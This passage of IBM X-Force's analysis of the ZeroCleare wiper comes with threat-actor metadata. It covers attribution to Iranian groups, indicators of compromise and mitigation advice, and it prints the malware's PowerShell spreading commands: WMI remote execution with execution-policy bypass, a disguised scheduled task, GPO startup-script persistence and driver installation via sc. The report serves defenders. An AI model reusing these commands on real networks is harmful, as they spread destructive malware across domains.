below.\n\n**ClientUpdate.ps1: Script’s Notable Functions**\n\n− CleanUp-ShareDrives\n\n`o` Runs command 'net.exe use * /delete /y' to disconnect all mapped network\ndrives\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\n– Start-DCController\n\n`o` Gets a list of all domain controllers for current domain and stores as $AllDC.\n\n− For each DC in $AllDC:\n\n`o` Creates DCObject (this is a custom defined object which contains properties and\nfunctions to do tasks such as create shared drives/folders, and copy/run the\nscript on clients)\n\n`o` Creates shared drive \\\\$DCName\\C$\n\n`o` Creates directory \\\\$DCName\\C$\\Users\\Public\\Public Updates\\\n\n`o` Copies itself to \\\\$DCName\\C$\\Users\\Public\\Public Updates\\\n\n`o` Attempts to run the script on the DC in Agent mode with the following\ncommand:\n```\n Invoke-WmiMethod -class Win32_process -name Create -ArgumentList $CMD -ComputerName\n$this.DCName -Credential $Credential -ErrorAction Stop;\n\n```\n− Where $CMD is:\n\n```\nPowerShell.exe -exec bypass -WindowStyle Hidden -file $LocalScriptPath $Args\n\n```\n\n− $LocalScriptPath is:\n\n```\nC:\\Users\\Public\\Public Updates\\$SelfScript\n\n```\n\n− And $Args are:\n```\n  \"-RunMode\", ('\"{0}\"' -f $RunMode),\n  \"-TimeSpan\", ('{0}' -f $TimeSpan),\n  \"-MaxThreads\", ('{0}' -f $MaxThreads),\n  \"-ClientCheckPort\", ('{0}' -f $ClientCheckPort),\n  \"-ClientCheckTimeOut\", ('{0}' -f $ClientCheckTimeOut),\n  \"-UserName\", ('\"{0}\"' -f $UserNameCollection.RAW),\n  \"-Password\", ('\"{0}\"' -f $PasswordCollection.RAW),\n  \"-DECKey\", ('\"{0}\"' -f $DECKey)\n  \"-MasterSlave\", \"-AgentMode\",\n  \"-DCHostName\", ('\"{0}\"' -f $this.DCName)\n\n```\n− If above fails it attempts to run instead:\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\n```\nInvoke-WmiMethod -class Win32_process -name Create -ArgumentList $CMD -ComputerName $\nthis.DCName -ErrorAction SilentlyContinue;\n\n```\nOnce it has done this for all systems in $AllDC, the ClientUpdate.ps1 PowerShell script then\nretrieves a list of all non-DC systems using the PowerShell module Get-ADComputer. It filters\nout those already present on its DC list and stores them as variable $AllClient.\n\nNext, the script divides up the client list and assigns portions to each of the initialized domain\ncontroller agents. The agents work to copy and execute the ZeroCleare malware onto each of\n\ntheir assigned clients.\n\nThere are also functions to keep track of agent workloads and the number of failed and\nsuccessful clients. A client is determined to have failed if the agent cannot connect to it and\ncreate a shared folder on it. As redundancy, a swapping mechanism is in place to pass failed\nclients to another agent to try to infect them. These agents do not appear to check the status\nof the drive wiping malware itself.\n\n**Start-AgentController**\n\n− Generates a ClientUpdateScript from the encrypted data within $UpdateTempContents.\nIn the sample we analyzed, the script generated was named 'ClientUpdateCore.ps1'.\n\n− Creates DCObject for supplied DCHostName (itself).\n\n− Creates a RunspacePool to allow for multithreading and then creates a thread for each\nclient in its assigned client list.\n\n− For each assigned client, the work thread creates a ClientUpdateObject for the\nspecified client, creates a shared drive on the client \\\\$DNSHostName\\C$, copies the\n```\n    $ClientUpdateScript to \\\\$DNSHostName\\C$\\Windows\\Temp, and then executes the script\n\n```\nusing the following:\n```\n Invoke-WmiMethod -class Win32_process -name Create -ArgumentList $CMD -ComputerName\n$this.DNSHostName -Credential $Credential -ErrorAction Stop\n\n```\n− Where $CMD is:\n```\n@(\n  \"PowerShell.exe\",\n  \"-exec\", \"bypass\",\n  \"-file\", ('\"{0}\"' -f $this.LocalScriptFilePath),\n  \"-TimeSpan\", ('{0}' -f $SCHTimeSpan),\n  \"-DCHostName\", ('\"{0}\"' -f $this.DCObject.DCName),\n\n```\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\n```\n  \"-ClientHostName\", ('\"{0}\"' -f $this.DNSHostName),\n  \"-UserName\", ('\"{0}\"' -f $UserName),\n  \"-Password\", ('\"{0}\"' -f $Password),\n  \"-DECKey\", ('\"{0}\"' -f $DECKey)\n  )\n\n```\nThe agent also keeps track of failed and successful clients so it can report back this status to\nthe master.\n\n**Start-MasterController**\n\n− Generates a ClientUpdateScript from the encrypted data within $UpdateTempContents. In\n\nthe sample we analyzed, the script generated was named ClientUpdateCore.ps1.\n\n− Checks if its own file is running from C:\\Users\\Public\\Public Updates, and if not, it will\n\nattempt to create the directory and copy itself into that destination.\n\n− Creates scheduled task called 'Optimize Startup' with start time listed as Get-Date + 20\nseconds. This task is designed to rerun itself from the new location. If the task registration\nis successful, then the script exits. If it finds the task already present then it uses it as an\n\nindication that it has already been restarted and continues on.\n\n− Gets a list of all domain controllers for the current domain as $AllDC\n\n− Gets a list of all non-DC systems as $AllClient\n\n− Loops through the list of DCs and performs the following for each (excluding itself or its\n\nparent):\n\n− Creates shared drive \\\\$DNSHostname\\C$\n\n− Checks if script already exists on the system\n\n− Creates work folder \\\\$DNSHostname\\C$\\Users\\Public\\Public Updates\\\n\n− Copies itself to the newly created work folder.\n\n− Runs the copied script in Master mode as follows:\n```\n Invoke-WmiMethod -class Win32_process -name Create -ArgumentList $CMD -ComputerName\n$this.DCName -Credential $Credential -ErrorAction Stop\n\n```\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\nWhere $CMD is:\n```\n \"PowerShell.exe\"\n   \"-exec\", \"bypass\",\n   \"-file\", ('\"{0}\"' -f $this.LocalScriptPath) $Args\n\n```\nAnd $Args are as follows:\n```\n \"-RunMode\", ('\"{0}\"' -f $RunMode),\n \"-TimeSpan\", ('{0}' -f $TimeSpan),\n \"-MaxThreads\", ('{0}' -f $MaxThreads),\n \"-ClientCheckPort\", ('{0}' -f $ClientCheckPort),\n \"-ClientCheckTimeOut\", ('{0}' -f $ClientCheckTimeOut),\n \"-UserName\", ('\"{0}\"' -f $UserNameCollection.RAW),\n \"-Password\", ('\"{0}\"' -f $PasswordCollection.RAW),\n \"-DECKey\", ('\"{0}\"' -f $DECKey),\n \"-Master\",\n \"-DCParent\", ('\"{0}\"' -f $SelfDC))\n\n```\n− Once all DCs have been initialized it creates a RunspacePool for multithreading and starts\n\na thread for each client in $AllClient. The thread does the following for each client:\n\n− Creates shared drive \\\\$DNSHostName\\C$\n\n− Attempts to copy the generated ClientUpdateScript to\n```\n    \\\\$DNSHostName\\C$\\Windows\\Temp\\UpdateTemp\n\n```\n− Runs copied script with:\n```\nInvoke-WmiMethod -class Win32_process -name Create -ArgumentList $CMD -ComputerName\n$this.DNSHostName -Credential $Credential -ErrorAction Stop;\n\n```\n− Where $CMD is:\n```\n  (\n    \"PowerShell.exe\",\n    \"-exec\", \"bypass\",\n    \"-file\", ('\"{0}\"' -f $this.LocalScriptFilePath),\n    \"-TimeSpan\", ('{0}' -f $SCHTimeSpan),\n    \"-DCHostName\", ('\"{0}\"' -f $this.DCObject.DCName),\n    \"-ClientHostName\", ('\"{0}\"' -f $this.DNSHostName),\n    \"-UserName\", ('\"{0}\"' -f $UserName),\n    \"-Password\", ('\"{0}\"' -f $Password),\n    \"-DECKey\", ('\"{0}\"' -f $DECKey)\n   )\n\n```\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\n**Extract-Self Function**\n\n− Creates directory $DataFolderPath `(\"$SelfPath\\UpdateTemp\").`\n\n− Decrypts contents of $UpdateTempContents (which is an array of Base64-encoded and\nAES-encrypted data contained within the script) using the supplied $DECKey.\n\n− Writes decrypted contents to $DataFolderPath.\n\n**Execute-Self Function**\n\n− Checks if a process named ClientUpdate is already running.\n\n− If it is not, then checks if system architecture is x86 or x64.\n\n− Next, starts process $DataFolderPath\\X86\\ClientUpdate.exe or\n```\n    $DataFolderPath\\X64\\ClientUpdate.exe depending on the above result.\n\n```\n**Encrypted Data Reveals Additional Copies of Existing Files**\n\nA redundancy mechanism of sorts, or maybe a way to resuscitate deleted malware files, the\n```\nClientUpdate.ps1 script contains a number of AES-encrypted and base64-encoded files stored\n\n```\nwithin an array called $UpdateTempContents. We decrypted the contents of\n```\n$UpdateTempContents using the identified key and found that these files all matched samples\n\n```\nwe encountered previously in this attack, namely.\n\n1. GPOClientUpdateCore.ps1\n\n2. ClientUpdateCore.ps1\n\n3. x64\\ClientUpdate.exe\n\n4. x64\\soy.exe\n\n5. x86\\ClientUpdate.exe\n\n6. x86\\elrawdsk.sys\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\nDrilling into the first script, GPOClientUpdateCore.ps1, we inferred it was used for an UpdateDCGPO function within ClientUpdate.ps1 script. This function applies a group policy object\n(GPO) to the domain controllers[6]. Within this function the script is copied to:\n```\n \"C:\\Windows\\SYSVOL\\sysvol\\$Domain\\Policies\\{$Guid}\\Machine\\Scripts\\Startup\\ClientUp\ndateCore.ps1\"\n\n```\nIt is then added as a GPO named 'ClietnUpdate' with following parameters:\n```\nAdded to \"C:\\Windows\\SYSVOL\\sysvol\\$Domain\\Policies\\{$Guid}\\Machine\\Scripts\\psscript\ns.ini\"\n  \"[Startup]\",\n  \"0CmdLine=ClientUpdateCore.ps1\"\n  ('0Parameters=-DECKey \"{0}\"' -f $DECKey),\n  \"[Shutdown]\",\n  \"0CmdLine=\",\n  \"0Parameters=\"\n Added to \"C:\\Windows\\SYSVOL\\sysvol\\$Domain\\Policies\\{$Guid}\\GPT.ini\"\n  \"[General]\",\n  \"Version=2\",\n  \"displayName=New Group Policy Object\"\n\n```\nThe script GPOClientUpdateCore.ps1 itself performs the following:\n\n− Creates folder C:\\Windows\\Temp\\UpdateTemp\\\n\n− Decrypts and extracts the encrypted contents of $UpdateTempContents to the newly\n\ncreated directory.\n\n− Checks if system is x86 or x64 and executes the corresponding version of\n```\n    ClientUpdate.exe.\n\n```\nThe contents of this script are generated at runtime by the Generate-ClientController function\nof ClientUpdate.ps1. The generation function should result in the contents of\n```\n$UpdateTempContents as found within ClientUpdate.ps1 that is copied to the next script,\nGPOClientUpdateCore.ps1. However, in the script we analyzed, this did not appear to work and\n$UpdateTempContents was empty. It could mean that the extraction and execution portions of\n\n```\nthis particular script sample failed.\n\n6 Group Policy provides centralized management and configuration of operating systems, applications, and users' settings in an\nActive Directory environment.\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\nDrilling into the second script, ClientUpdateCore.ps1, we inferred it was used by the Master\nand Agent systems to copy to and execute on target clients. This script does the following:\n\n− Decrypts and extracts the encrypted contents of $UpdateTempContents to $SelfPath\n\n− If parameter $IMM (immediate) is set, then it runs Execute-Self function immediately.\n\n− Otherwise it sleeps for the defined number of seconds and then runs Execute-Self\nfunction.\n\n− The Execute-Self function first checks if a process called ClientUpdate is already\n\nrunning. If it is not, then it checks if x86 or x64 and then executes the appropriate\nversion of ClientUpdate.exe.\n\nIn the specific sample provided of ClientUpdateCore.ps1, the generation script appears to\nhave not worked correctly and $UpdateTempContents is empty, meaning that the extraction and\nexecution parts of the function would have failed.\n\n### 1.9. ZeroCleare: A Likely Collaboration Between Iranian State Sponsored Groups\n\nX-Force IRIS assesses that the ZeroCleare campaign included compromise and access by\nactors from the ITG13 group and at least one additional group, likely Iran-based threat actors.\nThis assessment is based on ITG13's traditional mission, which has not included executing\ndestructive cyber-attacks in the past, the gap in time between the initial access facilitated by\nITG13, the last stage of the intrusion, as well as the different TTPs observed.\n\nLet’s look at the details of some of the resources used throughout the ZeroCleare attack and\nwhich can connect it with ITG13.\n\nFor initial access, the IP address 193.111.152[.]13, which was associated with ITG13 in recent\nOilrig/APT34 leaks, and as also reported by Palo Alto, was used to scan target networks and\naccess an account as early as the Fall of 2018.[7] A different Iranian threat actor likely accessed\naccounts from that address in mid-2019 preceding disk wiping operations.\n\nOne of the IP addresses used to access compromised network accounts in mid-2019 was\n194.187.249[.]103, which is adjacent to another IP address, 194.187.249[.]102. That last IP\naddress was used several months prior to the attack by the threat actor Hive0081 (aka\nxHunt).[8] While an interesting adjacency, X-Force IRIS does not have evidence Hive0081 was\n\n7 [https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/](https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/)\n\n8 [https://exchange.xforce.ibmcloud.com/collection/Suspected-Iranian-Threat-Actor-Campaign-Targeting-Kuwaiti-Entities-](https://exchange.xforce.ibmcloud.com/collection/Suspected-Iranian-Threat-Actor-Campaign-Targeting-Kuwaiti-Entities-04abb9338fef57ce9ecdec1c81d73865/reports)\n[04abb9338fef57ce9ecdec1c81d73865/reports](https://exchange.xforce.ibmcloud.com/collection/Suspected-Iranian-Threat-Actor-Campaign-Targeting-Kuwaiti-Entities-04abb9338fef57ce9ecdec1c81d73865/reports)\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\ninvolved in the ZeroCleare attack. Additionally, while recent reporting indicates that the\nRussian threat actor IRIS tracks as ITG12 (aka Turla) had access to ITG13 tools and\ninfrastructure potentially during this time frame, X-Force IRIS does not believe ITG12 was\nbehind the ZeroCleare attack.[9]\n\nDuring the destructive phase, the threat actor brute forced passwords to gain access to several\nnetwork accounts, which were used to install the [China Chopper](https://attack.mitre.org/software/S0020/) and Tunna web shells after\nexploiting a SharePoint vulnerability. X-Force IRIS found an additional web shell named\n\"extension.aspx\", which shared similarities with the ITG13 tool known as\n[TWOFACE/SEASHARPEE](https://attack.mitre.org/software/S0185/) including the methods that were dynamically called from assembly,\nthe use of AES encryption, as well as single letter variable names.\n\nThe same threat actor also attempted to leverage legitimate remote access software, such as\nTeamViewer, and used an obfuscated version of Mimikatz to collect credentials from\ncompromised servers.\n\nRegarding the ZeroCleare malware itself, while it shares some high-level similarities with\nShamoon v3, specifically in how it used an EldoS RawDisk driver, X-Force IRIS assesses that\nZeroCleare is dissimilar enough in its code and deployment mechanism to be considered\ndistinct from the Shamoon malware family and treated as separate malware.\n\nWhile X-Force IRIS cannot attribute the activity observed during the destructive phase of the\nZeroCleare campaign, we assess that high-level similarities with other Iranian threat actors,\nincluding the reliance on ASPX web shells and compromised VPN accounts, the link to ITG13\nactivity, and the attack aligning with Iranian objectives in the region, make it likely this attack\nwas executed by one or more Iranian threat groups.\n\n### 1.10. A New Destructive Wiper Threat in the Wild\n\nVarious links inferred from examining common TTPs and indicators of compromise as\nmentioned in the previous section make it possible that this wiper variant was built by Iranbased nation state attackers. Recent activity from that sphere includes the “Sakabota”\nbackdoor activity, recently [reported by X-Force IRIS, also tied to ITG13 (aka “Oilrig” and](https://exchange.xforce.ibmcloud.com/collection/Suspected-Iranian-Threat-Actor-Campaign-Targeting-Kuwaiti-Entities-04abb9338fef57ce9ecdec1c81d73865)\n[“APT34”), as well as the Lyceum campaign reported by Dell-EMC SecureWorks. In these](https://www.secureworks.com/blog/lyceum-takes-center-stage-in-middle-east-campaign)\ncampaigns, the top targets were Kuwaiti shipping and transportation organizations.\n\n9 [https://www.us-cert.gov/ncas/current-activity/2019/10/21/nsa-and-ncsc-release-joint-advisory-turla-group-activity](https://www.us-cert.gov/ncas/current-activity/2019/10/21/nsa-and-ncsc-release-joint-advisory-turla-group-activity)\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\n### 1.11. Energy Sector in the Crosshairs\n\nNation-state attackers have typically carried out destructive attacks against the energy sector,\nwith historic focus especially oil and gas; however, destructive attacks can target any entity.\nWhy has this sector been finding itself in the crosshairs of such activity?\n\nThe key role oil and gas production and processing play on both the national and global level,\nrepresents a high-value target for state-sponsored adversarial actors. These types of attackers\n[may be tasked with conducting anything from industrial espionage, to cyber kinetic attacks](https://www.reuters.com/article/us-usa-iran-oil-security/iran-oil-industry-must-be-alert-to-physical-cyber-threats-minister-idUSKBN1WE0IP)\ndesigned to disrupt the critical infrastructure of rival nations. Depending on the sophistication,\nscale, and frequency of attacks, cyber incidents in this space have the potential to disrupt\ncritical services, damage or destroy highly specialized equipment, and ultimately inflict\ndetrimental cascading effects upon global energy[10] security and industries downstream.[11,] [12]\n\nWhile nation state attacks have been happening more in the past decade, it is since at least\n2012 that Iranian state-sponsored threat actors have been leveraging cyber-attacks to inflict\ndestructive, kinetic effects on their targets.[13] The use of cyber-based weapons in lieu of\nconventional military tactics presents Iran, in this case, with a low-cost, and potentially\nnonattributable means of conducting hostile, and even warlike activity. With attribution to one\n\nspecific group becoming a challenge nowadays, working under the cyber cloak of anonymity\ncan also allow Iran to evade sanctions and preserve its relations with international players who\nmay support its economic and nuclear energy interests.\n\nLooking at the geographical region hit by the ZeroCleare malware, it is [not the first time the](https://securityintelligence.com/the-full-shamoon-how-the-devastating-malware-was-inserted-into-networks/)\nMiddle East has seen destructive attacks target its energy sector. In addition to underpinning\nthe economies of several Gulf nations, the Middle East petrochemical market, for example,\nhosts approximately 64.5% of the world’s proven oil reserves, making it a vital center of global\nenergy architecture.[14] Destructive cyberattacks against energy infrastructure in this arena\ntherefore represent a high-impact threat to both the regional and international markets.\n\n### 1.12. Mitigating the Risk Posed by Destructive Malware\n\nWhen it comes to destructive attacks, the critical actions for security teams to take are early\ndetection and escalation and coordinated response to contain and stop the spread. Here are\nsome tips from our team that can help mitigate the risk of destructive malware.\n\n10 https://www.cnbc.com/2019/09/21/saudi-aramco-attacks-could-predict-cyber-warfare-from-iran.html\n11 https://www.energy.senate.gov/public/index.cfm/files/serve?File_id=03BA54D2-A59B-43F8-A26D-CD027E675022\n12 [https://fas.org/irp/eprint/cyber-strat.pdf](https://fas.org/irp/eprint/cyber-strat.pdf)\n13 [https://www.nytimes.com/2012/10/24/business/global/cyberattack-on-saudi-oil-firm-disquiets-us.html](https://www.nytimes.com/2012/10/24/business/global/cyberattack-on-saudi-oil-firm-disquiets-us.html)\n\n14 [https://www.opec.org/opec_web/en/data_graphs/330.htm](https://www.opec.org/opec_web/en/data_graphs/330.htm)\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\n#### 1.12.1. Use and share threat intelligence to understand the risk to your organization\n\nEach threat actor has different motivations, capabilities, and intentions, and threat intelligence\ncan help provide insights that increase the efficacy of an organization’s preparedness and\neventual response to an incident. After the release of the ZeroCleare paper, our team received\nmore information from other research teams which helped us calibrate certain IOCs in the\npaper. Sharing threat intelligence is a practice defenders must prioritize to better mitigate risk.\n\n#### 1.12.2. Build effective defense-in-depth\n\nIncorporate multiple layers of security controls across the entire Cyberattack Preparation and\n[Execution Framework.](https://securityintelligence.com/media/ibm-x-force-iris-cyberattack-preparation-and-execution-frameworks)\n\n**Figure 3: X-Force IRIS Cyberattack Preparation and Execution Framework (Source: IBM X-Force)**\n\n#### 1.12.3. Deploy IAM, limit privileged users, and implement MFA\n\nIn most attacks, adversarial actors leverage privileged accounts to expand their foothold in\ncompromised networks. Limit the number of those accounts to a minimum and back them up\nwith multi-factor authentication (MFA). Also, don’t allow one account to access all systems.\n\nDeploy Identity and Access Management (IAM) to apply business-process centric policies to\nwhat your users can access. That way, if their account is compromised, the attacker will have a\nharder time using it for access to other parts of the network.\n\nLeveraging IAM can also help baseline legitimate access and alert security teams when lateral\n\nmovement could be abusing access to compromised accounts.\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\n#### 1.12.4. Have backups, test backups, and keep offline backups\n\nBacking up systems is a foundational best practice, but ensuring the organization has effective\nbackups of critical systems and testing these backups is more important than ever. Being able\nto use backups in recovery can make a significant difference in remediating destructive\nmalware attacks.\n\n#### 1.12.5. Test your response plans under pressure\n\nUse of a well-tailored tabletop exercise and a [cyber range simulation can help ensure that your](https://www.ibm.com/security/services/managed-security-services/security-operations-centers)\nteams are indeed ready, on both the tactical and strategic levels, to manage a destructive\nmalware incident.\n\nRehearsed response plans require ongoing testing and adjustment, but they allow the IR team\nto carry out plans and be able to implement them effectively when the time comes to respond\nand remediate.\n\nFor emergencies or if your organization is under attack, please call:\n\nX-FORCE EMERGENCY RESPONSE HOTLINE 888-241-9812\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\n## 2. Annex: IOCs\n\nThis section contains additional indicators of compromise (IOCs) related to each file and script\nwe analyzed.\n\n**ClientUpdate.exe (x64)**\n\nNotable Strings\n```\n\\\\?\\ElRawDisk\nSystem\\CurrentControlSet\\Control\\NetworkProvider\\Order\n{82B5234F-DF61-4638-95D5-341CAD244D19}\nb4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d\n\\??\\c:\n/c soy.exe\nC:\\windows\\system32\\cmd.exe\n\\\\.\\c:\nC:\\Users\\Developer\\source\\repos\\ZeroCleare\\x64\\Release\\zeroclear.pdb\n\n```\n**Soy.exe**\n\nFile System\n```\nsaddrv.sys\nelrawdsk.sys\n\n```\nService\n```\nName: VBoxDrv\nService Type: Driver\nStart Type: Demand Start\nBinary: $CurrentPath\\elrawdsk.sys\n\n```\nMutex\n\n```\nPtición de trabajo\n\n```\n\nNotable Strings\n```\nC:\\Users\\[User]\\Desktop\\TDL\\Source\\Furutaka\\output\\x64\\Release\\soy.pdb\nSoftware\\Oracle\\VirtualBox\nThe Magic Word!\nVBoxDrv\n\\Device\nVBoxUSBMon\nVBoxNetAdp\nVBoxNetLwf\n\\saddrv.sys\nPtición de trabajo\n\n```\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\n```\nelrawdsk.sys\nI'm 22 and looking for fulltime job!\n\n```\nOther\n\n```\nDevice: \\\\.\\vboxdrv\n\n```\n\n**ClientUpdate.exe (X86)**\n\nNotable Strings\n```\n\\\\?\\ElRawDisk\nSystem\\CurrentControlSet\\Control\\NetworkProvider\\Order\n{82B5234F-DF61-4638-95D5-341CAD244D19}\nb4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d\n\\??\\c:\nzeroclear.exe\nelrawdsk.sys\n /u /c sc create soydsk type= kernel start= demand binPath= \"\nC:\\windows\\system32\\cmd.exe\n /u /c sc start soydsk\n\\\\.\\c:\nC:\\Users\\Developer\\source\\repos\\ZeroCeare32\\Release\\zeroclear.pdb\n\n```\n**ClientUpdate.ps1**\n\nFile System\n```\nC:\\Users\\Public\\Public Updates\\\nC:\\Windows\\Temp\\UpdateTemp\\\nUpdateTemp\\\nClientUpdate.exe\nSoy.exe\nelrawdsk.sys\nClientUpdateCore.ps1\nGPOClientUpdateCore.ps1\n\n```\nScheduled Task\n```\nTask Name: \"Optimize Startup\"\nTrigger: Run once at $CurrentDate + 20 seconds\nDescription: \"This idle task reorganizes the cache files used to display the start menu. It is enabled onl\ny when the cache files are not optimally organized.\"\nAction: PowerShell.exe -exec bypass -WindowStyle Hidden -NoLogo -file $SelfScriptPath $ScriptArgs\n\n```\nGroup Policy Object (GPO)\n```\nName: \"ClietnUpdate\"\nTargetName: \"Domain Computers\"\nStartup Script: \"C:\\Windows\\SYSVOL\\sysvol\\$Domain\\Policies\\{$Guid}\\Machine\\Scripts\\Startup\\ClientUpdateCor\ne.ps1\"\n\n```\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\nOther\n```\nShared drive: \\\\$Hostname\\C$\nSMB Share: C:\\Public Updates\n\n```\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----\n\n## 3. About IBM X-Force\n\nIBM X-Force studies and monitors the latest threat trends, advising customers and the general\npublic about emerging and critical threats, and delivering security content to help protect IBM\ncustomers. From infrastructure, data and application protection to cloud and managed security\nservices, IBM Security Services has the expertise to help safeguard your critical assets. IBM\nSecurity protects some of the most sophisticated networks in the world and employs some of\n\nthe best minds in the business.\n\nLearn more at ibm.com/security.\n\n© Copyright IBM Corporation 2019\n\nIBM Security\n75 Binney St\nCambridge, MA 10504\nProduced in the United States of America\n\nFebruary 2019\n\nIBM, the IBM logo, ibm.com, and X-Force are trademarks of International Business Machines\nCorp., registered in many jurisdictions worldwide. Other product and service names might be\ntrademarks of IBM or other companies. A current list of IBM trademarks is available on the\nweb at “Copyright and trademark information” at ibm.com/legal/copytrade.shtml. This\ndocument is current as of the initial date of publication and may be changed by IBM at any\ntime.\n\nNot all offerings are available in every country in which IBM operates.\n\nTHE INFORMATION IN THIS DOCUMENT IS PROVIDED “AS IS” WITHOUT ANY WARRANTY,\nEXPRESS OR IMPLIED, INCLUDING WITHOUT ANY WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND ANY WARRANTY OR CONDITION OF NONINFRINGEMENT. IBM products are warranted according to the terms and conditions of the\nagreements under which they are provided.\n\nNew Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East | X-Force IRIS\n\nU di l f d i d hi i bj h i i h d f hi d\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2020.01.xx.ZeroCleare_Wiper/200122_IBM_X-Force_IRIS_ZeroCleare_Paper.pdf",
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-01-01 - New Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East.pdf"
    ],
    "report_names": [
        "200122_IBM_X-Force_IRIS_ZeroCleare_Paper",
        "2020-01-01 - New Destructive Wiper “ZeroCleare” Targets Energy Sector in the Middle East.pdf"
    ],
    "threat_actors": [
        {
            "id": "ce10c1bd-4467-45f9-af83-28fc88e35ca4",
            "created_at": "2022-10-25T15:50:23.458833Z",
            "updated_at": "2025-03-27T02:00:55.475188Z",
            "deleted_at": null,
            "main_name": "APT34",
            "aliases": null,
            "source_name": "MITRE:APT34",
            "tools": [
                "netstat",
                "Systeminfo",
                "PsExec",
                "SEASHARPEE",
                "Tasklist",
                "Mimikatz",
                "POWRUNER",
                "certutil"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "cde987a8-c71f-49e2-b761-5b7fa2b4ada6",
            "created_at": "2022-10-25T16:07:23.706646Z",
            "updated_at": "2025-03-27T02:02:09.933918Z",
            "deleted_at": null,
            "main_name": "Hexane",
            "aliases": [
                "ATK 120",
                "Cobalt Lyceum",
                "Lyceum",
                "Operation Out to Sea",
                "Siamesekitten",
                "Yellow Dev 9"
            ],
            "source_name": "ETDA:Hexane",
            "tools": [
                "DanBot",
                "DanDrop",
                "Decrypt-RDCMan.ps1",
                "Get-LAPSP.ps1",
                "James",
                "Milan",
                "kl.ps1"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "21e998eb-31c8-4281-be1d-1a5133330eb9",
            "created_at": "2023-01-06T13:46:39.14468Z",
            "updated_at": "2025-03-27T02:00:03.007083Z",
            "deleted_at": null,
            "main_name": "COBALT KATANA",
            "aliases": [
                "Hive0081 (IBM)",
                "SectorD01 (NHSC)",
                "xHunt campaign (Palo Alto)",
                "Hunter Serpens"
            ],
            "source_name": "MISPGALAXY:COBALT KATANA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
            "created_at": "2022-10-25T15:50:23.38055Z",
            "updated_at": "2025-03-27T02:00:55.459558Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "COBALT GYPSY",
                "IRN2",
                "APT34",
                "Helix Kitten",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "EUROPIUM",
                "ITG13"
            ],
            "source_name": "MITRE:OilRig",
            "tools": [
                "ISMInjector",
                "RDAT",
                "Systeminfo",
                "QUADAGENT",
                "OopsIE",
                "Tasklist",
                "certutil",
                "ZeroCleare",
                "POWRUNER",
                "netstat",
                "ipconfig",
                "LaZagne",
                "BONDUPDATER",
                "SideTwist",
                "PsExec",
                "SEASHARPEE",
                "Mimikatz",
                "RGDoor",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
